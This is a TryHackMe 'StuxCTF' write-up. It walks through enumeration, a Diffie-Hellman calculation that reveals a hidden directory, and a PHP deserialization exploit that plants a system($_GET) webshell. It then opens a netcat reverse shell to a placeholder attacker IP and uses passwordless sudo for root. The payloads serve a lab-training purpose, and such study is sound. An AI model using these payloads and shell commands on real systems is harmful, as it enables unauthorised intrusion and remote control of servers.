---
title: "StuxCTF - TryHackMe"
date: 2025-03-02
categories: [TryHackMe]
tags: [web, linux, enumeration, ssrf, ssti, rabbitmq, medium]
---
![Image](https://github.com/user-attachments/assets/fa31639d-0da5-4b54-adb9-cc160d445feb)

Crypto, serealization, priv scalation and more ...!

This machine is part of **TryHackMe** and is rated as a **medium**-level Linux challenge. It provides an excellent opportunity to practice skills in **web enumeration, cryptographic exploits, and privilege escalation**. Throughout the challenge, we will explore a vulnerable web application, exploit misconfigurations, and ultimately gain root access. Let's dive into the journey and uncover the secrets hidden within this machine!

--- 
### Recon

To start, we add the target's IP address to our `/etc/hosts` file and perform a full port scan using **nmap** :

```
nmap 10.10.53.93 -sV -sC -p- -oN nmapres
```

![Image](https://github.com/user-attachments/assets/70599491-f2f7-4e90-9e6b-3889bb4609c2)

The scan reveals two open ports :

-  `22/tcp` : using `ssh` service
-  80/tcp : using `http` service

Next, we can perform a directory enumeration using `gobuster`.

![Image](https://github.com/user-attachments/assets/eab51530-89fe-426f-bee4-625499160e82)

The scan reveals that we can only access `http://stux.thm:80`.

We can continue enumerating with a `dirsearch` scan.

![Image](https://github.com/user-attachments/assets/75676008-efaa-4a7a-b5d9-be13fd8d99c2)

The scan reveals a `robots.txt` file.

Let's check the web page at `http://stux.thm:80`.

![Image](https://github.com/user-attachments/assets/eedc0410-24c8-4ec9-9325-c192d2b91f91)

It seems that we cannot find any relevant information on the page itself. However, if we check the **View Page Source**, we can uncover some interesting details.

![Image](https://github.com/user-attachments/assets/7d64e5c5-f7a5-4ee9-906b-befa795061fb)
This reveals the following strings  : 

- p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251;
- g: 7;
- a: 330;
- b: 450;
- g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617;

These appear to be cryptographic parameters that, if processed correctly, could reveal a secret directory.

Upon checking the `http://stux.thm:80/robots.txt` file that we found earlier, we see that the file hints at the cryptographic algorithm we should use:

![Image](https://github.com/user-attachments/assets/66413606-8bb8-4db4-a3f2-2c87eeed8c6a)

Thus, we can assume that **Diffie-Hellman** is the algorithm we need to use in order to find the secret key, which will lead us to the secret directory.

---
### Diffie-Hellman  algorithm 

In this part of the challenge, we need to derive the secret shared key using the **Diffie-Hellman** key exchange algorithm. Diffie-Hellman allows two parties (Alice and Bob) to securely exchange a shared key over an insecure communication channel. However, in this case, the challenge involves a third party (Charlie) as well. We need to compute the shared secret using the information provided, which includes **Alice's private key (a)**, **Bob's private key (b)** and **Charlie’s public key (g^c mod p)**.

---
### Diffie-Hellman process with three parties

In this case, we have **Charlie’s public value (`g^c mod p`)**, which is already provided as a pre-computed public key. Charlie is not participating directly in the key exchange, but his public value is involved in deriving the shared secret.

With **Charlie**’s public value included, we need to combine the values from **Alice’s private key `a`**, **Bob’s private key `b`**, and **Charlie’s public key `g^c mod p`** to compute the shared secret.

Here’s the process broken down :

1. **Step 1**: Alice uses Charlie's public key **`g^c mod p`** and raises it to the power of her private key `a`. This operation is equivalent to computing **`g^(ac) mod p`**, which Alice performs as:  
    `key = (g^c)^a mod p`.
    
2. **Step 2**: Bob then takes the result from Alice (which is `g^(ac) mod p`) and raises it to the power of his private key `b`. This operation gives us the final shared secret:  
    `key = (g^(ac))^b mod p = g^(abc) mod p`.
    

At the end of these steps, both **Alice** and **Bob** will compute the same shared secret `g^(abc) mod p`, which can then be used to decrypt messages or access secret data (such as a hidden directory).

````python
def power(a, b, p):
    # Compute (a^b) mod p
    if b == 1:
        return a % p
    return pow(a, b, p)

def main():
    # Alice's private key
    a = 330

    # Bob's private key
    b = 450

    # Charlie's public key (g^c mod p)
    charlie_key = 609191[...]454617

    # Public parameters (p and g)
    p = 997529[...]591251
    g = 7

    # Step 1: Compute (g^c)^a mod p (Alice's calculation)
    key = power(charlie_key, a, p)  # (g^c)^a mod p

    # Step 2: Compute (g^(ac))^b mod p (Bob's calculation)
    key = power(key, b, p)  # g^(ca)^b mod p = g^(cab) mod p

    # Print the secret shared key
    print("Secret key: ", key)

if __name__ == "__main__":
    main()
````

By combining **Alice's private key**, **Bob's private key**, and **Charlie's public key**, we can compute the shared secret key. This key is used to unlock the secret...

```text
Secret key :  473150[...]976839
```

--- 
### Finding the hidden directory 

The challenge gives us a hint which is : "HINT: \[...] first 128 characters ..." 

So we can ajust our code by adding this : 

```python 
print ("First 128 character : ",str(key)[:128])
```

And we get this in output : 

```text
First 128 character : 4731502[...]855055
```

Now we can access to the **hidden** directory with `http://stux.thm:80/4731502[...]855055`

![Image](https://github.com/user-attachments/assets/014e243a-00e4-46e8-88d4-2ce41edee92a)

It worked, and we've successfully discovered the hidden directory!

--- 
### Recon 2

At this point, we can start enumerating the new information we've gathered. Let's use `ffuf` to search for any **GET** parameters that could be vulnerable to **local file inclusion** (LFI) attacks or to simply identify a file access parameter.

```shell 
ffuf -u "http://stux.thm/4731502[...]855055/?FUZZ=" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fw 284
```

```shell 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________
[...]

________________________________________________

 :: Method           : GET
 :: URL              : http://stux.thm/4731502[...]855055/?FUZZ=
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 284
________________________________________________

file                    [Status: 200, Size: 1182, Words: 286, Lines: 32, Duration: 26ms]
:: Progress: [4734/4734] :: Job [1/1] :: 696 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

The scan reveals that we have found the word `file` as a **GET** parameter.

Additionally, upon checking the **View Page Source** again, we can spot a **hint** :

![Image](https://github.com/user-attachments/assets/e3a9ba38-b090-4835-ada8-55dd283cdaf7)

Based on the `ffuf` output and the hint provided, it seems we may be able to access local files via the URL `http://stux.thm:80/4731502[...]855055/?file=`.

Next, we can use `ffuf` again to enumerate possible files that we can analyze :

```shell
ffuf -u "http://stux.thm/4731502[...]855055/?file=FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt  -fw 286 
````

```shell

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://stux.thm/4731502[...]855055/?file=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 286
________________________________________________

assets                  [Status: 200, Size: 1168, Words: 284, Lines: 32, Duration: 26ms]
index.php               [Status: 200, Size: 6664, Words: 284, Lines: 32, Duration: 40ms]
:: Progress: [4734/4734] :: Job [1/1] :: 1379 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

We’ve just found an `index.php` file. Let’s check if we can uncover any sensitive information within it.

![Image](https://github.com/user-attachments/assets/0677738c-93fb-40a9-817e-47840f6b4200)


Using `Burp Suite`, we discovered an output that seems to be encrypted. To decrypt it, we'll use [CyberChef](https://gchq.github.io/CyberChef/).

First, we apply the `From Hex` operation, and we get a result that appears to be a `Base64` encoded message, identifiable by the `==` pattern.

![Image](https://github.com/user-attachments/assets/7aa8cf8a-2c61-4293-9fdd-277b3ae5a211)

Next, we can apply the `reverse` operation followed by `From Base64` to see if we can decrypt the message.

![Image](https://github.com/user-attachments/assets/0ac75af0-9fe9-41c4-aed4-acfb5f9af3b6)

After decrypting the message, we obtain the **`index.php`** source code.  

Upon analyzing it, we find a **vulnerable section**:

```php 
$file_name = $_GET['file'];<br />

if(isset($file_name) && !file_exists($file_name)){<br />

echo "File no Exist!";<br />

}<br />

<br />

if($file_name=="index.php"){<br />

$content = file_get_contents($file_name);<br />

$tags = array("", "");<br />

echo bin2hex(strrev(base64_encode(nl2br(str_replace($tags, "", $content)))));<br />

}<br />

unserialize(file_get_contents($file_name));<br />
[...]
```

We identify a major **PHP Object Injection** vulnerability due to this line : 

```php
unserialize(file_get_contents($file_name));
```

- The script **retrieves** the content of a file (given in the `file` parameter).
- Then, it **unserializes** its content, which can be extremely dangerous if we control the file.

This means we can craft a **malicious serialized PHP object** that will be interpreted by `unserialize()`.  
In this case, we see that there is a **`file` class** in the code :

```php
class file {
    public $file = "dump.txt";
    public $data = "dump test";

    function __destruct(){
        file_put_contents($this->file, $this->data);
    }
}
```

This class has a **destructor** (`__destruct()`), which automatically writes **`$data` into `$file`** when the object is destroyed.  
This means that if we **control the serialized object**, we can **create a file with arbitrary content on the server**.

So let's try to exploit this vulnerability with the following code : 

```php
<?php 
class file{
	public $file = "test.php";
	public $data = "<?php echo 'Is it vulnerable ?' ?>";
}
print(serialize(new file));
?>
```

Then let's execute the code :

![Image](https://github.com/user-attachments/assets/695fe43c-a0e7-4f2e-8df9-31b794cf2953)

And we obtain a new serialized object for the exploit. Now, let's test if it works.

To do this, we first need to make a request to retrieve the contents of the `output.txt` file on our local machine. We can use a simple Python HTTP server to serve the serialized payload :

```bash 
python3 -m http.server 4321
```

Then, we make a request from the target server to fetch our malicious object :

```bash
http://stux.thm/4731502[...]855055/?file=http://YOUR_IP:4321/output.txt
```


![Image](https://github.com/user-attachments/assets/ecabc838-b798-4c2c-8cea-216185d93e92)

![Image](https://github.com/user-attachments/assets/582dcad5-3598-4b7b-a286-b76e9b6a912a)

If the exploit works as expected, the server will **deserialize our injected object**, triggering the `__destruct()` function and writing our payload to a new file on the target machine. We can navigate to `test.php` to see if the exploit worked : 

![Image](https://github.com/user-attachments/assets/a3d4d211-ea50-42c6-ac5a-8c9a87af823e)

And it worked ! 

---
### Initial foothold

Now that we have identified the **unserialization vulnerability**, we can exploit it to gain a foothold on the target machine.

Our plan is to create a **malicious PHP object** that, when deserialized, writes a **webshell** to the server. This will allow us to execute commands remotely.

To do this, we craft the following PHP script :

```php
<?php 
class file {
	public $file = "exploit.php";
	public $data = '<?php system($_GET["c"])?>'; 
}
print(serialize(new file));
?>
```

![Image](https://github.com/user-attachments/assets/307d288d-622d-4170-9cb8-a914cdf5cef9)

Now, we **repeat our previous steps** to inject the serialized payload into the target server.

After making the request to unserialize the payload, our `exploit.php` file should be created on the server.

![Image](https://github.com/user-attachments/assets/74e91bc5-d789-42f4-b27d-f271a6c44224)

![Image](https://github.com/user-attachments/assets/dabeaf05-f91c-49d6-961b-41c67f7692ce)

Once the webshell is in place, we can test it by visiting :

```bash
http://stux.thm/4731502[...]855055/exploit.php?c=whoami
```

If the exploit works, we should see the **current user** of the target machine displayed in the response :
![Image](https://github.com/user-attachments/assets/e1e7be45-ea1c-417c-95dd-e743f44bf99d)

It's worked, so now with command execution confirmed, we can upgrade our access to a **fully interactive reverse shell**.

We use the following **Netcat reverse shell payload** :

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f
```

Since this needs to be **URL-encoded**, it would look like this :

```sh
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20<ATTACKER_IP>%20<ATTACKER_PORT>%20%3E%2Ftmp%2Ff
```

![Image](https://github.com/user-attachments/assets/7f4dac2f-b997-49d3-b79e-b146c08c9204)

We start a **Netcat listener** on our attack machine :

```bash 
nc -lvnp <ATTACKER_PORT>
```

Then, we trigger the shell by accessing :

```bash
http://stux.thm/4731502[...]855055/exploit.php?c=<URL_ENCODED_PAYLOAD>
```

And we successfully establish a connection to the target machine.

![Image](https://github.com/user-attachments/assets/9d23a1fa-932f-4593-aa22-1048b7358b1a)

--- 
### User flag 

Now that we have access, our next step is to retrieve the user flag.

![Image](https://github.com/user-attachments/assets/18db29f4-12cd-4aee-aaf5-974fb32e1565)

--- 
### Recon 3 

Now, let's enumerate the system to better understand the environment and identify any vulnerabilities or misconfigurations that could lead us to the **root** flag.

![Image](https://github.com/user-attachments/assets/706a1447-4842-4fc2-ba23-dd592a4bbdd1)

The output of the `sudo -l` command reveals that the `www-data` user has permission to execute any command as root **without requiring a password**. A critical misconfiguration that we can exploit...

--- 
### Privilege escalation 

With root access obtained, we can now retrieve the **root flag** :

![Image](https://github.com/user-attachments/assets/94dc664d-9200-4d9a-aef9-29f5e20f488a)

--- 
### Root flag 

Finally, we can now read the **root flag** :

![Image](https://github.com/user-attachments/assets/e1e9bca1-fb5c-4536-83ff-98dadd898a2f)

--- 

**Congratulations!** I hope you found this write-up insightful. This CTF was a great challenge that highlighted the importance of carefully analyzing cryptographic implementations, recognizing vulnerabilities in PHP deserialization, and leveraging misconfigurations for privilege escalation. From breaking Diffie-Hellman to gaining root access, this challenge demonstrated how a structured approach and persistence are key in penetration testing.

Thanks for reading, and happy hacking!

![Image](https://github.com/user-attachments/assets/2b622fb3-9d90-4c6f-ba07-e9da3ac9a76a)

